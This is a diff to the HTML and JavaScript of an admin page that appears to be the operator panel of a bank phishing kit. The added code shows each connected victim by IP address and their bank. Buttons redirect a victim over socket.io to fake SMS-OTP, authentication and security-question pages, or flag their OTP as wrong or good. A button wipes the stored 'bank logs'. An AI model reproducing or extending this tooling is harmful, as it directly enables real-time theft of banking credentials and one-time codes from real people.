@@ -25,12 +25,16 @@
                     <li class="nav-item">
                         <a class="nav-link" href="/admin">Admin</a>
                     </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="/admin/config">Config</a>
+                    </li>
                 </ul>
             </div>
         </div>
     </nav>
     <div class="container mt-5">
         <h2>User Connections</h2>
+        <button class="btn btn-danger mb-2" onclick="removeAllUsers()">Delete All Users</button>
         <table class="table table-bordered">
             <thead>
                 <tr>
@@ -46,14 +50,26 @@
 
             </tbody>
         </table>
+        
     </div>
     <script src="/socket.io/socket.io.js"></script>
     <script>
         const socket = io();
 
+        function removeAllUsers() {
+            // Confirm with the user before deletion
+            const confirmed = window.confirm("Are you sure you want to delete all users? ***IF YOU DO, NOTE THAT ALL THE BANK LOGS INFO WILL BE DESTROYS***");
+            if (confirmed) {
+                socket.emit('usersRemoveAll');
+            }
+        }
+
+
+        function controlUser(userIP, page) {
+            socket.emit('btnRedirection', { page: page, ip: userIP })
+        }
+
         socket.on('updateTable', function (users) {
-            let wrong = false;
-            let good = true;
             let tableHTML = '';
             users.forEach(user => {
                 tableHTML += `
@@ -62,7 +78,13 @@
                         <td>${user.status ? 'Active' : 'Inactive'}</td>
                         <td>${user.page || '-'}</td>
                         <td>${user.banks || '-'}</td>
-                        <td>
+                        <td> <button class="btn btn-primary" onclick="controlUser('${user.ip}', '${user.banks}/sms-otp')">OTP</button>
+                    <button class="btn btn-secondary" onclick="controlUser('${user.ip}', '${user.banks}/auth')">Auth</button>
+                    <button class="btn btn-info" onclick="controlUser('${user.ip}', '${user.banks}/question/2')">Quest2</button>
+                    <button class="btn btn-warning" onclick="controlUser('${user.ip}', 'sms-otp?action=0')">Wrong otp</button>
+                    <button class="btn btn-success" onclick="controlUser('${user.ip}', '${user.nextPage}')">Good otp</button>
+                    <button class="btn btn-warning" onclick="controlUser('${user.ip}', 'finish')">Finish</button>
+</td>
 
                 </td>
                     </tr>`;
@@ -74,6 +96,7 @@
         integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL"
         crossorigin="anonymous"></script>
 </body>
+
 </html>
 
 <!--
